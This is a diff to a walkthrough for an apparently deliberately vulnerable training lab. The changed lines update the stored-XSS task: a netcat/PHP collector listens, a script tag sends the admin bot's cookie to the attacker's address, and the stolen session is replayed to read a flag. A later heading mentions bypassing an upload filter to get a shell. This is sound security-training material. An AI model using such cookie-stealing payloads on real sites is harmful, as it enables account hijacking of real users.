@@ -70,12 +70,21 @@ payload that sends the admin's cookie to it when the admin bot views the page.
 ```bash
 php -S 0.0.0.0:9000      # your collector (or: nc -lvnp 9000)
 ```
-Payload (post it as a support message):
+The collector **must** bind to `0.0.0.0`, not `localhost`/`127.0.0.1`, or the
+bot's connection will be refused.
+
+The admin bot runs on the host network, so point the payload at your machine's
+real address, exactly as a remote attacker's beacon would. Find your IP with
+`hostname -I`, then post this as a support message:
 ```html
-<script>new Image().src='http://host.docker.internal:9000/c?k='+encodeURIComponent(document.cookie)</script>
+<script>new Image().src='http://YOUR_IP:9000/c?k='+encodeURIComponent(document.cookie)</script>
 ```
 When the admin bot visits, you receive its `session` cookie. Set that cookie in
 your browser and open **http://localhost:8081/vault.php** to read the flag.
+
+> **macOS / Windows (Docker Desktop):** host networking works differently there,
+> so the real-IP beacon may not reach you. Use `http://host.docker.internal:9000/...`
+> in the payload instead — Docker Desktop maps that hostname to your host.
 
 ### Task 4: File upload to shell
 The document upload only blocks names ending in `.php`, and the uploads folder
